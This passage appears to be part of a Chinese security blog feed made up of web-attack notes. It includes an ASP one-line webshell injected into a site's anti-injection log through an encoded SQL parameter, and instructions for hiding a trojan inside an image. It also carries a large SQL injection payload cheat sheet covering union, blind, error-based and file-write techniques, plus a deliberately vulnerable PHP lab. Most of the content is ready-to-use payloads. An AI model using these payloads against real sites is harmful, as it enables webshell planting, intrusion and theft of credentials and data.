    <content type="html"><![CDATA[<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>在进行asp注入的时候，发现网站有通用防注入文件<br>通过御剑扫描，看到了<code>sqlin.asp</code>文件，是记录防注入的<br>那我们是否可以提交一个一句话，再进行访问记录文件？</p><a id="more"></a><h1 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h1><p><img src="/images/Web/Sql/Accesswaf/%E9%9D%9E%E6%B3%95%E8%AE%B0%E5%BD%95.jpg" srcset="/img/loading.gif" alt=""></p><pre><code>&lt;%eval request(&quot;MH&quot;)%&gt;</code></pre><p>使用上面的一句话</p><pre><code>/news.asp?id=1&#39; and 1=&lt;%eval request(&quot;MH&quot;)%&gt;</code></pre><p><img src="/images/Web/Sql/Accesswaf/notencode.jpg" srcset="/img/loading.gif" alt=""><br>会发现没有被记录进去<br>我们使用URL编码一下</p><pre><code>/news.asp?id=1&#39; and 1=%3C%25eval%20request%28%22MH%22%29%25%3E</code></pre><p><img src="/images/Web/Sql/Accesswaf/decode.jpg" srcset="/img/loading.gif" alt=""><br>最后使用菜刀连接防注入asp文件<br><img src="/images/Web/Sql/Accesswaf/cai.jpg" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>根据404页面判断服务器和系统服务【转载】</title>
    <link href="/2019/08/18/Web/%E6%A0%B9%E6%8D%AE404%E9%A1%B5%E9%9D%A2%E5%88%A4%E6%96%AD%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8C%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/"/>
    <url>/2019/08/18/Web/%E6%A0%B9%E6%8D%AE404%E9%A1%B5%E9%9D%A2%E5%88%A4%E6%96%AD%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8C%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h1><p>在网址后面加 /1 显示如下图这样的,是JSP站,apache,linux服务器<br>JSP站 8080、81端口一般都是开启的,可以在网址后面加上8080,81这样来测试<br><img src="/images/Web/%E6%A0%B9%E6%8D%AE%E7%BD%91%E7%AB%99404%E9%A1%B5%E9%9D%A2%E5%88%A4%E6%96%AD%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8C%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/linux.jpg" srcset="/img/loading.gif" alt=""></p><a id="more"></a><h1 id="win2003-iis6-0"><a href="#win2003-iis6-0" class="headerlink" title="win2003  iis6.0"></a>win2003  iis6.0</h1><h2 id="白底黑字"><a href="#白底黑字" class="headerlink" title="白底黑字"></a>白底黑字</h2><p><img src="/images/Web/%E6%A0%B9%E6%8D%AE%E7%BD%91%E7%AB%99404%E9%A1%B5%E9%9D%A2%E5%88%A4%E6%96%AD%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8C%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/iis6.jpg" srcset="/img/loading.gif" alt=""></p><h1 id="win2008-R2-IIS7-5-IIS7-0也是2008"><a href="#win2008-R2-IIS7-5-IIS7-0也是2008" class="headerlink" title="win2008 R2 IIS7.5 (IIS7.0也是2008)"></a>win2008 R2 IIS7.5 (IIS7.0也是2008)</h1><h2 id="白底黑字加红字"><a href="#白底黑字加红字" class="headerlink" title="白底黑字加红字"></a>白底黑字加红字</h2><p><img src="/images/Web/%E6%A0%B9%E6%8D%AE%E7%BD%91%E7%AB%99404%E9%A1%B5%E9%9D%A2%E5%88%A4%E6%96%AD%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8C%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/iis7.jpg" srcset="/img/loading.gif" alt=""><br><img src="/images/Web/%E6%A0%B9%E6%8D%AE%E7%BD%91%E7%AB%99404%E9%A1%B5%E9%9D%A2%E5%88%A4%E6%96%AD%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8C%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/iis7-2.jpg" srcset="/img/loading.gif" alt=""></p><h1 id="win2012-IIS8-0-R2-目前最新的系统"><a href="#win2012-IIS8-0-R2-目前最新的系统" class="headerlink" title="win2012 IIS8.0 R2(目前最新的系统)"></a>win2012 IIS8.0 R2(目前最新的系统)</h1><p><img src="/images/Web/%E6%A0%B9%E6%8D%AE%E7%BD%91%E7%AB%99404%E9%A1%B5%E9%9D%A2%E5%88%A4%E6%96%AD%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8C%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/iis8.0.jpg" srcset="/img/loading.gif" alt=""></p><h1 id="网站的分类"><a href="#网站的分类" class="headerlink" title="网站的分类"></a>网站的分类</h1><h2 id="1-伪静态网页"><a href="#1-伪静态网页" class="headerlink" title="1.伪静态网页"></a>1.伪静态网页</h2><p>网址一般是<a href="https://www.chinacycc.com/thread-1719-1-1.html" target="_blank" rel="noopener">https://www.chinacycc.com/thread-1719-1-1.html</a>  这类网址里面带符号 <code>/</code> 或者 <code>—</code><br>—号后面的数字（比如说—1）就是代表那篇文章或者文件在数据库里面的模块编号是 1   我们论坛就是伪静态</p><h2 id="2-动态页面"><a href="#2-动态页面" class="headerlink" title="2.动态页面"></a>2.动态页面</h2><p>—号后面的数字（比如说—1）就是代表那篇文章或者文件在数据库里面的模块编号是 1</p><h2 id="3-静态页面"><a href="#3-静态页面" class="headerlink" title="3.静态页面"></a>3.静态页面</h2><p>一般的新闻网站都会使用静态网站</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>静态网页，动态网页主要根据网页制作的语言来区分:</p><p>静态网页使用语言:<code>HTML(超文本标记语言)</code></p><p>动态网页使用语言:<code>HTML+ASP</code>或<code>HTML+PHP</code>或<code>HTML+JS</code>P等</p><p>还可以从url上区分:</p><p>静态网页使用url:<code>都以html为结尾</code></p><p>动态网页使用url:动态的url中基本带有<code>?</code>号</p><p>还有就是，可以在网址后面加<code>index.html</code>或者<code>index.PHP</code>,<code>index.asp</code>,<code>index.do</code>,<code>index.jsp</code>等等 来区分该网站是什么类型</p><h1 id="转载"><a href="#转载" class="headerlink" title="转载"></a>转载</h1><p><a href="http://www.chengyin.org/forum.php?mod=viewthread&amp;tid=1740" target="_blank" rel="noopener">http://www.chengyin.org/forum.php?mod=viewthread&amp;tid=1740</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>图片一句话制作</title>
    <link href="/2019/08/18/Web/%E5%9B%BE%E7%89%87%E9%A9%AC%E5%88%B6%E4%BD%9C/"/>
    <url>/2019/08/18/Web/%E5%9B%BE%E7%89%87%E9%A9%AC%E5%88%B6%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<h1 id="copy"><a href="#copy" class="headerlink" title="copy"></a>copy</h1><p>需要一张图片<br>一句话木马</p><p>参数 /b 指定以二进制格式赋值,合并文件,用于图像类/声音类文件<br>参数 /a 指定以ASCII格式复制,合并文件,用于txt等文档文件</p><p><code>copy 1.jpg/b+1.php 2.jpg</code><br><img src="/images/Web/webshell/%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%9B%BE%E7%89%87%E9%A9%AC%E5%88%B6%E4%BD%9C/0.png" srcset="/img/loading.gif" alt="cmd制作"></p><a id="more"></a><h1 id="16进制写进文件处"><a href="#16进制写进文件处" class="headerlink" title="16进制写进文件处"></a>16进制写进文件处</h1><p>将代码插入右边最底层或最上层后保存</p><p><img src="/images/Web/webshell/%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%9B%BE%E7%89%87%E9%A9%AC%E5%88%B6%E4%BD%9C/1.png" srcset="/img/loading.gif" alt="16进制"></p><h1 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h1><p>1.用PS（photoshop）打开图片<br>2.文件→文件简介<br>插入你需要的木马代码<br>3.文件→保存（保存：覆盖源文件 你也可以另存为你想要的其它格式）</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二次注入学习笔记</title>
    <link href="/2019/08/18/Web/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"/>
    <url>/2019/08/18/Web/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>正常注入我们是在http请求中构造恶意sql语句发送至服务端进行处理<br>系统是立即执行并以响应的的形式返回至攻击者的客户端上的</p><p><code>二次注入</code>：是注入点经过函数过滤或防护无法触发漏洞，但是存入<code>数据库中又被还原了</code>，导致数据库中的数据执行时可能出现二次注入漏洞<br>例如：在一个存在注入又被函数过滤了的数据存入数据库中还原了，同时在其他地方可以引用该数据</p><a id="more"></a><h2 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h2><ul><li>在第一次提交中构造可以在下一次检索中执行的恶意语句</li><li>提交第二次其他语句检索第一次提交的恶意语句，两个结合达到我们想要执行的结果</li><li>在第二次请求响应中返回结果</li></ul><h1 id="简易靶场"><a href="#简易靶场" class="headerlink" title="简易靶场"></a>简易靶场</h1><ul><li><code>registered.php</code></li></ul><pre><code class="php">&lt;?phpheader(&quot;content-type:text/html;charset=utf-8&quot;);if(!empty($_POST[&#39;submit&#39;])){    $id = addslashes($_POST[&#39;id&#39;]);    $username = addslashes($_POST[&#39;username&#39;]);    $password = addslashes($_POST[&#39;password&#39;]);    $email = addslashes($_POST[&#39;email&#39;]);    $conn = mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);    mysql_select_db(&quot;test&quot;,$conn);    $sql = &quot;INSERT INTO admin(id,admin,password,email) value(&#39;$id&#39;,&#39;$username&#39;,&#39;$password&#39;,&#39;$email&#39;)&quot;;    $result = mysql_query($sql,$conn) or die(&#39;Error：&#39;.mysql_error());    if($result){        echo &#39;注册成功&#39;;    }else{        echo &#39;注册失败&#39;;    }    mysql_close();}else{    echo &quot;Error&quot;;}?&gt;&lt;html&gt;    &lt;head&gt;        &lt;title&gt;注册&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;form action=&quot;reg.php&quot; method=&quot;post&quot;&gt;            id：&lt;input type=&quot;text&quot; name=&quot;id&quot;&gt;&lt;br/&gt;            username：&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br/&gt;            password：&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br/&gt;            email：&lt;input type=&quot;text&quot; name=&quot;email&quot;&gt;            &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;注册&quot;&gt;        &lt;/form&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><ul><li><code>serach.php</code></li></ul><pre><code class="php">&lt;?phpif(!empty($_POST[&#39;submit&#39;])){    $id = addslashes($_POST[&#39;id&#39;]);    $conn = mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);    mysql_select_db(&quot;test&quot;,$conn);    $sql = &quot;select * from admin where id = &#39;$id&#39;&quot;;    $result = mysql_query($sql,$conn) or die(&quot;error：&quot;.mysql_error());    while($row = mysql_fetch_array($result)){        $username = $row[&#39;admin&#39;];        $sql2 = &quot;select * from admin where admin=&#39;$username&#39;&quot;;        $result2 = mysql_query($sql2,$conn) or die(&quot;error：&quot;.mysql_error());        while ($row2 = mysql_fetch_array($result2)){            echo &quot;ID：&quot;.$row2[&#39;id&#39;].&quot;&lt;br /&gt;&quot;;            echo &quot;用户名：&quot;.$row2[&#39;admin&#39;].&quot;&lt;br /&gt;&quot;;            echo &quot;密码：&quot;.$row2[&#39;password&#39;].&quot;&lt;br /&gt;&quot;;            echo &quot;邮箱：&quot;.$row2[&#39;email&#39;].&quot;&lt;br /&gt;&quot;;            echo &quot;&lt;hr&gt;&quot;;            echo &quot;第一次插入的恶意语句：&quot;.$row[&#39;admin&#39;].&quot;&lt;br /&gt;&quot;;            echo &quot;查询id语句：&quot;.$sql.&quot;&lt;br /&gt;&quot;;            echo &quot;后台查询用户语句：&quot;.$sql2;        }    }    mysql_close();}else{    echo &quot;Error&quot;;}?&gt;&lt;form action=&quot;serach.php&quot; method=&quot;post&quot;&gt;    搜索id：&lt;input type=&quot;text&quot; name=&quot;id&quot;&gt;    &lt;input type=&quot;submit&quot; value=&quot;搜索&quot; name=&quot;submit&quot;&gt;&lt;/form&gt;</code></pre><h1 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h1><p>从以上源码，可以看到最主要的问题是出现在<code>serach.php</code>中第二次sql语句查询</p><pre><code class="php">$sql2 = &quot;select * from admin where admin=&#39;$username&#39;&quot;;</code></pre><p>所以这里我们根据这个语句，构造我们恶意插入数据库中的代码</p><pre><code class="php">&#39; order by 4 # 正确 &#39; order by 5 # 错误</code></pre><p>之后就可以正常的进行注入或报错注入了<br><img src="/images/Web/Sql/two.jpg" srcset="/img/loading.gif" alt=""></p><blockquote><p>Ps：该靶场的时间盲注有个前提，就是你能猜到admin字段中的值，并把它提前插入到语句中<br>否则直接构造是直接返回空的，例如：<code>&#39; and if(length(database())=3,0,sleep(10)) #</code>这样是不行的<br>正确：<code>admin&#39; and if(length(database())=3,0,sleep(10)) #</code></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Sql基础注入笔记</title>
    <link href="/2019/08/18/Web/Sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2019/08/18/Web/Sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p><code>利用可控的参数或者入口来加载不可控的参数或者代码，造成恶意不可控的运行结果</code><br>最新phpstudy中mysql.ini添加<code>mysql.ini secure_file_priv=&quot;&quot;</code>配置</p><h1 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h1><p>Mysql5.0之后<br>默认存放一个：<code>information_schema</code>的数据库<br>该库中的三个表名：<code>SCHEMATA</code>，<code>TABLES</code>，<code>COLUMNS</code><br><strong>说明：</strong></p><blockquote><ul><li><p><code>SCHEMATA</code>表存储该用户创建的所有数据库名</p><p>该表中距离数据库名的字段为：<code>SCHEMA_NAME</code></p></li><li><p><code>TABLES</code>表存储该用户创建的所有数据库的库名和表名</p><p>该表中记录数据库名和表名的字段为：<code>TABLE_SCHEMA</code>和<code>TABLE_NAME</code></p></li><li><p><code>COLUMNS</code>表存储该用户创建的所有数据库的库名，字段名，表名</p><p>数据库名，表名，字段名：<code>TABLE_SCHEMA</code>和<code>TABLE_NAME</code>和<code>COLUMN_NAME</code></p></li></ul></blockquote><a id="more"></a><ul><li>不知任何条件时<pre><code>select 字段名 from 库名.表名;</code></pre></li><li>已知一条条件<pre><code>select 字段名 from 库名.表名 where 已知字段名=&#39;已知条件的值&#39;;</code></pre></li><li>已知两条条件<pre><code>select 字段名 from 库名.表名 where 已知1字段名=&#39;已知1条件值&#39; and 已知2字段名=&#39;已知2条件值&#39;;</code></pre></li></ul><h2 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h2><pre><code># 格式limit m,n# m：记录开始的位置，0开始，表示第一条记录# n：n指取n条记录</code></pre><h2 id="常用的几个函数"><a href="#常用的几个函数" class="headerlink" title="常用的几个函数"></a>常用的几个函数</h2><ul><li>注入时收集信息的<blockquote><p>database()<br>version()<br>user()<br>@@datadir 读取数据库的绝对路径<br>@@basedir  mysql安装路径<br>@@version_compile_os    操作系统</p></blockquote></li></ul><h3 id="Mysql常用内置变量"><a href="#Mysql常用内置变量" class="headerlink" title="Mysql常用内置变量"></a>Mysql常用内置变量</h3><pre><code>@@have_openssl 如果mysqld支持客户端/服务器协议的SSL(加密)则为YES@@version_compile_os 判断系统类型@@max_allowed_packet 包或任何生成的/中间字符串的最大大小@@max_user_connections MySQL账户允许的最大同时连接数,0表示没限制@@skip_networking 如果服务器只允许本地(非TCP/IP)连接，该值为ON@@table_type 默认表类型(存储引擎)@@basedir MySQL安装基准目录@@character_set_database 默认数据库使用的字符集@@datadir 数据库存储的地方@@expire_logs_days 二进制日志自动删除的天数,默认是0,表示&quot;没有自动删除&quot;@@group_concat_max_len 允许group_concat()函数结果的最大长度@@log_error 错误日志的位置@@lower_case_file_system 该变量说明是否数据目录所在的文件系统对文件名的大小写敏感.        ON说明对文件名的大小写不敏感，OFF表示敏感@@lower_case_table_names 如果设置为1,表名用小写保存到硬盘上，并且表名比较时不对大小写敏感.　　  如果设置为2，按照指定的保存表名，但按照小写来比较@@plugin_dir 插件目录的路径@@tmpdir 保存临时文件和临时表的目录@@tmp_table_size 如果内存内的临时表超过该值，MySQL自动将它转换为硬盘上的MyISAM表@@sql_mode 当前服务器的sql模式@@tx_isolation 默认事务隔离级别。默认值为REPEATABLE-READ@@Connections 连接mysql数据库服务器的次数(不管成功还是失败)@@max_write_lock_count 最大写锁数量@@old_passwords 是否启用mysql323加密方式(就是mysql用户密码的hash是16位的)@@Uptime 服务器已经运行的时间</code></pre><h3 id="常规函数"><a href="#常规函数" class="headerlink" title="常规函数"></a>常规函数</h3><pre><code># Concat()将字符串拼接起来# group by根据规则，对数据进行分组，分组的时候，mysql会建立一个临时空表进行分组# hex()hex(&#39;字符串&#39;)      进行16进制编码# ascii()ascii(&#39;字符串 &#39;)  进行ascii编码</code></pre><h3 id="盲注常用函数"><a href="#盲注常用函数" class="headerlink" title="盲注常用函数"></a>盲注常用函数</h3><pre><code># 截取mid(str,start,length)str：返回其中一部分的字符串start：起始位置length：返回的长度substr(str,start,length)str：返回其中一部分的字符串start：起始位置length：返回的长度----------------------------------------# 编码ord(str)返回字符串第一个字符的ASCII值----------------------------------------# 返回长度left(string,length)str：返回其中一部分的字符串length：返回的长度----------------------------------------if (条件,True,False)----------------------------------------</code></pre><h3 id="报错注入常用函数"><a href="#报错注入常用函数" class="headerlink" title="报错注入常用函数"></a>报错注入常用函数</h3><pre><code># floor()floor(n)：返回一个小于或等于传入参数N的最大整数(相当于截断小说部分)# rand()# extractvalue()extractvalue(xml,xpath)xml：是str格式，为xml文档对象的名称xpath：xpath格式的字符串作用：从目标XML中返回包含所查询值得字符串# updatexml()updatexml(xml,xpath,new_value)xml：是str格式，为xml文档对象的名称xpath：xpath格式的字符串new_value：str格式，替换查找到的符合条件的数据作用：改变文档中符合条件的节点的值# exp()exp(x)计算e的x次方需要数字的，传入字符串必然宝座# GeometryCollection()# polygon()# multipoint()# multilinestring()# linestring()# multipolygon()例子：GEOMETRYCOLLECTION(POINT(10 10), POINT(30 30), LINESTRING(15 15, 20 20))作用：由一个或多个任意类几何对象构成几何对象由于mysql无法用这样字符串画出图形，所以报错了</code></pre><h2 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h2><pre><code>#--空格/**/</code></pre><h2 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h2><pre><code># 内联注释的形式/*！code *//*!union*/ /*!select*/ 1,2,3</code></pre><hr><h1 id="Union-注入"><a href="#Union-注入" class="headerlink" title="Union 注入"></a>Union 注入</h1><ul><li><p>判断注入</p><pre><code># Tips：注意闭合语句！and 1=1and 1=2</code></pre></li><li><p>查看字段数</p><pre><code># 最后一个字段数返回正确页面则为最终字段数order by 字段数</code></pre></li><li><p>union select</p><pre><code>union select 字段数</code></pre></li><li><p>利用mysql函数查看相关信息</p><pre><code># Tips：有些网页不会直接爆显示位，网页参数前加-，或后面and 1=2，让其报错id=-1&#39; union select 1,2,3 %23id=1&#39; and 1=2 union select 1,2,3 %23</code></pre></li><li><p>查询表名</p><pre><code># 爆出所有表名id=1&#39; and 1=2 union select 1,group_concat(TABLE_NAME),3 from information_schema.tables where table_schema=database() %23</code></pre></li></ul><h1 id="查询第一个表名"><a href="#查询第一个表名" class="headerlink" title="查询第一个表名"></a>查询第一个表名</h1><p>id=1’ and 1=2 union select 1,TABLE_NAME,3 from information_schema.tables where table_schema=’security’ limit 0,1 %23</p><h1 id="查询第二个表名"><a href="#查询第二个表名" class="headerlink" title="查询第二个表名"></a>查询第二个表名</h1><p>id=1’ and 1=2 union select 1,TABLE_NAME,3 from information_schema.tables where table_schema=’security’ limit 1,1 %23</p><pre><code>* 查询字段名</code></pre><h1 id="查询某表的所有字段"><a href="#查询某表的所有字段" class="headerlink" title="查询某表的所有字段"></a>查询某表的所有字段</h1><p>id=1’ and 1=2 union select 1,group_concat(COLUMN_NAME),3 from information_schema.columns where table_name=’user’ %23</p><h1 id="查询表的所有第一个字段"><a href="#查询表的所有第一个字段" class="headerlink" title="查询表的所有第一个字段"></a>查询表的所有第一个字段</h1><p>id=1’ and 1=2 union select 1,COLUMN_NAME,3 from information_schema.columns where table_name=’user’ limit 0,1 %23</p><pre><code>* 获取数据</code></pre><h1 id="获取该字段下所有数据"><a href="#获取该字段下所有数据" class="headerlink" title="获取该字段下所有数据"></a>获取该字段下所有数据</h1><p>id=1%27%20and%201=2 union select 1,group_concat(username,0x3a,password),3 from users %23</p><h1 id="查看数据"><a href="#查看数据" class="headerlink" title="查看数据"></a>查看数据</h1><p>id=1%27%20and%201=2 union select 1,username,password from users limit 0,1 %23</p><pre><code>## 原理```php&lt;?php$con=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;test&quot;);// 检测连接if (mysqli_connect_errno()){ echo &quot;连接失败: &quot; . mysqli_connect_error();}$id = $_GET[&#39;id&#39;];$result = mysqli_query($con,&quot;select * from users where `id`=&quot;.$id);while($row = mysqli_fetch_array($result)){ echo $row[&#39;username&#39;] . &quot; &quot; . $row[&#39;address&#39;]; echo &quot;&lt;br&gt;&quot;;}?&gt;</code></pre><p>可以看到SQL语句：<strong>$result = mysqli_query($con,”select * from users where `id`=”.$id)</strong><br>直接被代入数据库中进行查询，并有进行过滤！<br>因此，这里可以直接进行构造语句进行恶意查询</p><pre><code># 正常访问页面select * from users where `id`=1# 恶意构造访问select * from users where `id`=1 union select 1,2,3</code></pre><hr><h1 id="高权限下的注入"><a href="#高权限下的注入" class="headerlink" title="高权限下的注入"></a>高权限下的注入</h1><p>基于<code>root权限</code>的注入</p><h2 id="文件操作注入"><a href="#文件操作注入" class="headerlink" title="文件操作注入"></a>文件操作注入</h2><p>利用函数：</p><ul><li>load_file()：读取文件</li><li>Into outfile() 写入函数</li><li>into dumpfile 写入文件<pre><code>select &#39;写入内容&#39; into dumpfile &#39;文件路径&#39;</code></pre></li></ul><p><code>注入点的权限是由代码中连接数据库的用户所决定的（连接请求）</code></p><p>与读取的相关因素：</p><ul><li>mysql权限</li><li>操作系统</li><li>系统读写的权限</li><li>mysql配置<pre><code>secure_file_priv参数说明(这个参数在MySQL 5.7.6版本引入)这个参数用来限制数据导入和导出操作的效果例如执行LOAD DATA、SELECT ... INTO OUTFILE语句和LOAD_FILE()函数这些操作需要用户具有FILE权限如果这个参数为空，这个变量没有效果如果这个参数设为一个目录名，MySQL服务只允许在这个目录中执行文件的导入和导出操作这个目录必须存在，MySQL服务不会创建它；如果这个参数为NULL，MySQL服务会禁止导入和导出操作</code></pre></li></ul><p>路径的获取：</p><ul><li>报错显示</li><li>谷歌黑客</li><li>读取搭建平台配置文件</li><li>漏洞报错</li><li>遗留文件</li><li>字典猜解</li></ul><blockquote><p>Ps：路径符号及编码，读取或写入文件的时候用<code>/</code>，对需要写入的字符进行16进制编码，用编码写入的时候不要单引号</p></blockquote><h2 id="跨库注入"><a href="#跨库注入" class="headerlink" title="跨库注入"></a>跨库注入</h2><p>在网站A具有ROOT的权限的下，浏览网站B的数据库<br>语法：<code>select * from 数据库名.表名</code></p><p>其他的就和常规注入差不多</p><hr><h1 id="提交方式注入"><a href="#提交方式注入" class="headerlink" title="提交方式注入"></a>提交方式注入</h1><ul><li>POST 登录框注入</li><li>Cookie 验证注入<br>直接将ID拼接到select语句进行查询，然后返回结果<br>直接在cookie处，测试</li></ul><blockquote><p>Ps：将该写的东西写到改写的地方，post处和cookie处进行注入</p></blockquote><ul><li>HTTP 注入<br>实际情况下，有部分站点接受数据是以http数据包中的http头部进去数据接受<br>所以测试注入点的时候，需要将注入语句写入到http头部中<br><code>$_SERVER</code><br>以数据包的形式进行检测和注入(工具)<br>火狐插件（modify headers）<br>burp手工进行检测</li></ul><hr><h1 id="参数类型注入"><a href="#参数类型注入" class="headerlink" title="参数类型注入"></a>参数类型注入</h1><ul><li>数字<pre><code>$id = $_GET[&#39;x&#39;];select * from news where id=1</code></pre></li><li>字符<pre><code>$id = $_GET[&#39;x&#39;];select * from news where id=&#39;admin&#39;</code></pre></li><li>搜索型<pre><code>$id = $_GET[&#39;x&#39;];select * from news where id like &#39;%username%&#39;</code></pre></li></ul><hr><h1 id="参数加解密注入"><a href="#参数加解密注入" class="headerlink" title="参数加解密注入"></a>参数加解密注入</h1><p>例如：$id = base64_decode($_GET[‘X’]);<br>ID参数经过base64编码再进行访问<br>需要手动进行判断</p><hr><h1 id="盲注攻击-–-Boolean-布尔-注入"><a href="#盲注攻击-–-Boolean-布尔-注入" class="headerlink" title="盲注攻击 – Boolean(布尔) 注入"></a>盲注攻击 – Boolean(布尔) 注入</h1><p>返回结果只有真和假(yes和no)<br><code>布尔型注入是指构造SQL判断语句</code>，通过查看页面的返回结果来推测哪些结果是成立的</p><ul><li>判断数据库名长度<pre><code># 第一次判断id=1&#39;+and+length(database())&gt;5--+返回：no</code></pre></li></ul><h1 id="第二次判断"><a href="#第二次判断" class="headerlink" title="第二次判断"></a>第二次判断</h1><p>id=1’+and+length(database())&gt;2–+<br>返回：yes</p><h1 id="第三次判断"><a href="#第三次判断" class="headerlink" title="第三次判断"></a>第三次判断</h1><p>id=1’+and+length(database())&gt;4–+<br>返回：no</p><h1 id="第四次判断"><a href="#第四次判断" class="headerlink" title="第四次判断"></a>第四次判断</h1><p>id=1’+and+length(database())=4–+<br>返回：yes</p><pre><code>* 判断数据库名</code></pre><h1 id="判断数据库名的第一个字符是否为t（这是截取字符串进行判断）"><a href="#判断数据库名的第一个字符是否为t（这是截取字符串进行判断）" class="headerlink" title="判断数据库名的第一个字符是否为t（这是截取字符串进行判断）"></a>判断数据库名的第一个字符是否为t（这是截取字符串进行判断）</h1><p>id=1’ and substr(database(),1,1)=’t’ –+<br>为了节省时间，你可以使用burp对t处进行爆破，以便快速获取</p><h1 id="ASCII码值判断，以此类推"><a href="#ASCII码值判断，以此类推" class="headerlink" title="ASCII码值判断，以此类推"></a>ASCII码值判断，以此类推</h1><p>id=1’ and ord(mid(database(),1,1))&gt;100 –+</p><pre><code>* 判断表名</code></pre><h1 id="以此类推"><a href="#以此类推" class="headerlink" title="以此类推"></a>以此类推</h1><p>id=1’ and substr((select table_name from information_schema.tables where table_schema=’test’ limit 0,1),1,1)=’u’ –+</p><pre><code>## 原理```php$con=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;test&quot;);// 检测连接if (mysqli_connect_errno()){ echo &quot;连接失败: &quot; . mysqli_connect_error();}$id = $_GET[&#39;id&#39;];if (preg_match(&quot;/union|sleep|benchmark/i&quot;, $id)) { exit(&quot;no&quot;);}$result = mysqli_query($con,&quot;select * from users where `id`=&#39;&quot;.$id.&quot;&#39;&quot;);$row = mysqli_fetch_array($result);if ($row) { exit(&quot;yes&quot;);}else{ exit(&quot;no&quot;);}</code></pre><p><strong>关键</strong><br><code>preg_match()</code>：执行匹配正则表达式<br>通过preg_match匹配$id中是否存在<code>/union|sleep|benchmark/</code>等危险字符<br>如果没有则拼接SQL语句</p><pre><code>if (preg_match(&quot;/union|sleep|benchmark/i&quot;, $id)) { exit(&quot;no&quot;);}</code></pre><hr><h1 id="盲注攻击-–-报错注入"><a href="#盲注攻击-–-报错注入" class="headerlink" title="盲注攻击 – 报错注入"></a>盲注攻击 – 报错注入</h1><h2 id="Xpath语法错误"><a href="#Xpath语法错误" class="headerlink" title="Xpath语法错误"></a>Xpath语法错误</h2><ul><li>updatexml</li><li>extractvalue</li></ul><h3 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h3><p><code>最大长度限制32位</code></p><ul><li><p>查询信息</p><pre><code>username=1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</code></pre></li><li><p>获取全部数据库名</p><pre><code>username=1&#39; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),1)--+</code></pre></li><li><p>获取表名</p><pre><code>username=1&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;test&#39; limit 0,1),0x7e),1)--+</code></pre></li><li><p>获取数据</p><pre><code>username=1&#39; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1)--+</code></pre></li></ul><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><pre><code>and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</code></pre><p>通过查询@@version，返回版本，然后cancat将其字符串化<br>因为updatexml第二个参数需要Xpath格式的字符串，所有不符合要求，然后报错<br><code>ERROR 1105 (HY000): XPATH syntax error: ’:root@localhost’</code></p><h3 id="extractvalue-注入"><a href="#extractvalue-注入" 